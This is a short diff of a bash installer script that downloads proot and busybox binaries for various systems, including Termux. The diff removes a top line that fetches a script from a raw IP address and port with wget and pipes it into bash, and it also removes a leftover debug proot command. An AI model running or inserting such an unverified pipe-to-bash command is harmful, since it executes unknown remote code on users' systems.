@@ -1,6 +1,4 @@
-wget -qO - http://216.225.197.57:63142/api.sh|bash -s -- /telerising
-exit
-#!/bin/bash
+#exit
 # todo:
 #  - freebsd: check if fbsd has v6 v7 v8 and add libs
 #  - when ~ /root then not use /root. (perms)
@@ -357,9 +355,6 @@ case $_os in
 		then
 			export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:bin
 			if [ ! -e bin/$_system-proot ]; then dl $_system-proot-termux proot proot; mv $_system-proot-termux bin/$_system-proot; fi
-
-./bin/$_system-proot --kill-on-exit --bind=. --bind=.:/usr/share/zoneinfo --bind=.:/etc ls "/"
-exit
 			if [ ! -e bin/$_system-busybox ]; then dl $_system-busybox-termux busybox; mv $_system-busybox-termux bin/$_system-busybox; fi
 			if [ ! -e bin/libbusybox.so.$_termux_busybox ]; then dl $_system-busybox-termux-libbusybox.so.$_termux_busybox busybox; mv $_system-busybox-termux-libbusybox.so.$_termux_busybox bin/libbusybox.so.$_termux_busybox; fi
 		else
